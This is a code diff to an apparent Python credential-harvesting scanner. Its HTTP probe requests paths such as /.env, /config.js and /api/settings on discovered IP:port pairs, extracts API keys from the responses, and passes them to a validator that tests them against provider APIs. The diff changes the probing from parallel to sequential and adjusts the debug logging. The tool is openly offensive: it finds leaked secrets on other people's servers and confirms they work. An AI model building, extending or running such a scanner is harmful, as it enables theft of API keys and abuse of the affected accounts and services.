@@ -1,7 +1,6 @@
 """
-HTTP probe — ALL endpoints in parallel per IP:port.
-Logs HTTP status codes for debugging.
-Parallel fetch means total time = max(endpoint), not sum(endpoints).
+HTTP probe — fires HTTP requests at discovered ports to find API key panels.
+Sequential endpoint probing with debug logging.
 """
 import re
 import logging
@@ -11,7 +10,6 @@ import aiohttp
 
 logger = logging.getLogger(__name__)
 
-# High-value endpoints — ordered by likelihood
 TARGET_ENDPOINTS = [
     "/api/settings", "/.env", "/config.js", "/api/config",
     "/config.json", "/env", "/server.js", "/app.js",
@@ -59,54 +57,42 @@ class FoundKey:
 
 
 class HTTPProbe:
-    """Probes IP:port for API keys — ALL endpoints in parallel per port."""
+    """Probes IP:port — sequential endpoints, logs every response."""
 
-    def __init__(self, timeout: float = 5.0):
+    def __init__(self, timeout: float = 8.0):
         self.timeout = timeout
         self.connector = aiohttp.TCPConnector(
-            limit=0,  # no limit on total connections
-            limit_per_host=10,  # but limit per host to avoid hammering one IP
-            force_close=True,
-            ttl_dns_cache=30,
+            limit=0, limit_per_host=3, force_close=True, ttl_dns_cache=30,
         )
 
     async def probe_ip_port(self, ip: str, port: int) -> list[FoundKey]:
-        """Probe ALL endpoints on one IP:port IN PARALLEL. Returns keys found."""
         found = []
         async with aiohttp.ClientSession(connector=self.connector) as session:
-            # Fire ALL endpoint requests in parallel
-            tasks = []
-            for ep in TARGET_ENDPOINTS:
+            for idx, ep in enumerate(TARGET_ENDPOINTS):
                 url = f"http://{ip}:{port}{ep}"
-                tasks.append(self._fetch_one(session, url, ip, port, ep))
-
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-
-            # Collect all keys found across all endpoints
-            for r in results:
-                if isinstance(r, list) and r:
-                    found.extend(r)
-
+                try:
+                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout), ssl=False) as resp:
+                        status = resp.status
+                        if status in (200, 401, 403):
+                            text = await resp.text()
+                            keys = self._extract(text, ip, port, ep)
+                            if keys:
+                                logger.info(f"🔑 HTTP {status} {ip}:{port}{ep} — {len(keys)} KEY(S)")
+                                found.extend(keys)
+                            elif idx < 3:
+                                # Only log first few endpoints to reduce noise
+                                logger.info(f"HTTP {status} {ip}:{port}{ep} — probing...")
+                            if status in (200, 401) and not keys:
+                                # Server responded with real content but no keys
+                                # Still useful to know
+                                if idx < 3:
+                                    logger.info(f"HTTP {status} {ip}:{port}{ep} — live server, {len(text)}b")
+                except asyncio.TimeoutError:
+                    if idx < 3:
+                        logger.info(f"TIMEOUT {ip}:{port}{ep}")
+                except (aiohttp.ClientError, Exception):
+                    pass
         return found
-
-    async def _fetch_one(self, session, url: str, ip: str, port: int, endpoint: str):
-        """Fetch a single endpoint and extract keys."""
-        try:
-            async with session.get(
-                url,
-                timeout=aiohttp.ClientTimeout(total=self.timeout),
-                ssl=False,
-            ) as resp:
-                # Log interesting responses for debugging
-                if resp.status in (200, 401, 403, 500, 502):
-                    text = await resp.text()
-                    keys = self._extract(text, ip, port, endpoint)
-                    if keys:
-                        logger.info(f"HTTP {resp.status} on {ip}:{port}{endpoint} — FOUND {len(keys)} KEY(S)")
-                    return keys
-        except (asyncio.TimeoutError, aiohttp.ClientError, Exception):
-            pass
-        return None
 
     def _extract(self, text: str, ip: str, port: int, endpoint: str) -> list[FoundKey]:
         found = []
@@ -117,7 +103,7 @@ class HTTPProbe:
 
 
 class KeyValidator:
-    """Validates keys against provider APIs — parallel batch."""
+    """Validates keys against provider APIs."""
 
     def __init__(self, timeout: float = 8.0):
         self.timeout = timeout
